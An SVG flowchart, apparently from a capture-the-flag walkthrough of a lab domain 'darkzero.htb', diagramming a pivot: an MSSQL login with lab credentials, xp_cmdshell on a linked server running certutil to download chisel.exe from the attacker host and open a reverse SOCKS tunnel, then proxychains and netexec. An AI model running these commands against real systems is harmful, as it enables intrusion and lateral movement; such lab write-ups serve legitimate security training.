<svg width="100%" viewBox="0 0 680 750" xmlns="http://www.w3.org/2000/svg" font-family="sans-serif">
  <defs>
    <marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
      <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
    </marker>
  </defs>

  <!-- Step 0 -->
  <rect x="40" y="30" width="580" height="56" rx="8" fill="#EEEDFE" stroke="#534AB7" stroke-width="0.5"/>
  <text x="330" y="50" text-anchor="middle" dominant-baseline="central" font-size="14" font-weight="500" fill="#3C3489">Step 0 — open MSSQL session</text>
  <text x="330" y="70" text-anchor="middle" dominant-baseline="central" font-size="12" fill="#534AB7">mssqlclient darkzero.htb/john.w:'RFulUtONCOL!'@10.129.12.60 -windows-auth</text>

  <!-- Step 1 -->
  <rect x="40" y="120" width="270" height="56" rx="8" fill="#E6F1FB" stroke="#185FA5" stroke-width="0.5"/>
  <text x="175" y="140" text-anchor="middle" dominant-baseline="central" font-size="14" font-weight="500" fill="#0C447C">Step 1 — chisel server</text>
  <text x="175" y="160" text-anchor="middle" dominant-baseline="central" font-size="12" fill="#185FA5">chisel server -p 8000 --reverse</text>

  <!-- Step 2 -->
  <rect x="350" y="120" width="270" height="56" rx="8" fill="#E6F1FB" stroke="#185FA5" stroke-width="0.5"/>
  <text x="485" y="140" text-anchor="middle" dominant-baseline="central" font-size="14" font-weight="500" fill="#0C447C">Step 2 — HTTP server</text>
  <text x="485" y="160" text-anchor="middle" dominant-baseline="central" font-size="12" fill="#185FA5">python3 -m http.server 8080</text>

  <!-- connectors 0→1, 0→2 -->
  <path d="M175 86 L175 118" fill="none" stroke="#534AB7" stroke-width="1.5" marker-end="url(#arrow)"/>
  <path d="M485 86 L485 118" fill="none" stroke="#534AB7" stroke-width="1.5" marker-end="url(#arrow)"/>

  <!-- Step 3 -->
  <rect x="40" y="210" width="580" height="70" rx="8" fill="#E1F5EE" stroke="#0F6E56" stroke-width="0.5"/>
  <text x="330" y="232" text-anchor="middle" dominant-baseline="central" font-size="14" font-weight="500" fill="#085041">Step 3 — download chisel.exe to DC02</text>
  <text x="330" y="252" text-anchor="middle" dominant-baseline="central" font-size="12" fill="#0F6E56">EXECUTE ('EXEC xp_cmdshell ''certutil -f</text>
  <text x="330" y="269" text-anchor="middle" dominant-baseline="central" font-size="12" fill="#0F6E56">http://10.10.14.36:8080/chisel.exe C:\Windows\Temp\chisel.exe''') AT [DC02.darkzero.ext];</text>

  <!-- connector 1→3 -->
  <path d="M175 176 L175 196 L330 196 L330 208" fill="none" stroke="#0F6E56" stroke-width="1.5" marker-end="url(#arrow)"/>

  <!-- Step 4 -->
  <rect x="40" y="314" width="580" height="70" rx="8" fill="#E1F5EE" stroke="#0F6E56" stroke-width="0.5"/>
  <text x="330" y="336" text-anchor="middle" dominant-baseline="central" font-size="14" font-weight="500" fill="#085041">Step 4 — run chisel client on DC02</text>
  <text x="330" y="356" text-anchor="middle" dominant-baseline="central" font-size="12" fill="#0F6E56">EXECUTE ('EXEC xp_cmdshell ''C:\Windows\Temp\chisel.exe</text>
  <text x="330" y="373" text-anchor="middle" dominant-baseline="central" font-size="12" fill="#0F6E56">client 10.10.14.36:8000 R:socks''') AT [DC02.darkzero.ext];</text>

  <!-- connector 3→4 -->
  <line x1="330" y1="282" x2="330" y2="312" fill="none" stroke="#0F6E56" stroke-width="1.5" marker-end="url(#arrow)"/>

  <!-- Step 5 -->
  <rect x="40" y="418" width="580" height="56" rx="8" fill="#FAEEDA" stroke="#854F0B" stroke-width="0.5"/>
  <text x="330" y="438" text-anchor="middle" dominant-baseline="central" font-size="14" font-weight="500" fill="#633806">Step 5 — configure proxychains</text>
  <text x="330" y="458" text-anchor="middle" dominant-baseline="central" font-size="12" fill="#854F0B">echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf</text>

  <!-- connector 4→5 -->
  <line x1="330" y1="384" x2="330" y2="416" fill="none" stroke="#854F0B" stroke-width="1.5" marker-end="url(#arrow)"/>

  <!-- Step 6 -->
  <rect x="40" y="508" width="580" height="56" rx="8" fill="#EAF3DE" stroke="#3B6D11" stroke-width="0.5"/>
  <text x="330" y="528" text-anchor="middle" dominant-baseline="central" font-size="14" font-weight="500" fill="#27500A">Step 6 — verify tunnel</text>
  <text x="330" y="548" text-anchor="middle" dominant-baseline="central" font-size="12" fill="#3B6D11">proxychains netexec smb 172.16.20.1 -u 'john.w' -p 'RFulUtONCOL!'</text>

  <!-- connector 5→6 -->
  <line x1="330" y1="474" x2="330" y2="506" fill="none" stroke="#3B6D11" stroke-width="1.5" marker-end="url(#arrow)"/>

  <!-- Legend -->
  <rect x="40" y="590" width="12" height="12" rx="2" fill="#EEEDFE" stroke="#534AB7" stroke-width="0.5"/>
  <text x="58" y="600" font-size="12" fill="#534AB7">Initial session</text>
  <rect x="170" y="590" width="12" height="12" rx="2" fill="#E6F1FB" stroke="#185FA5" stroke-width="0.5"/>
  <text x="188" y="600" font-size="12" fill="#185FA5">Kali action</text>
  <rect x="280" y="590" width="12" height="12" rx="2" fill="#E1F5EE" stroke="#0F6E56" stroke-width="0.5"/>
  <text x="298" y="600" font-size="12" fill="#0F6E56">MSSQL linked server</text>
  <rect x="450" y="590" width="12" height="12" rx="2" fill="#FAEEDA" stroke="#854F0B" stroke-width="0.5"/>
  <text x="468" y="600" font-size="12" fill="#854F0B">Config</text>
  <rect x="530" y="590" width="12" height="12" rx="2" fill="#EAF3DE" stroke="#3B6D11" stroke-width="0.5"/>
  <text x="548" y="600" font-size="12" fill="#3B6D11">Verify</text>
</svg>
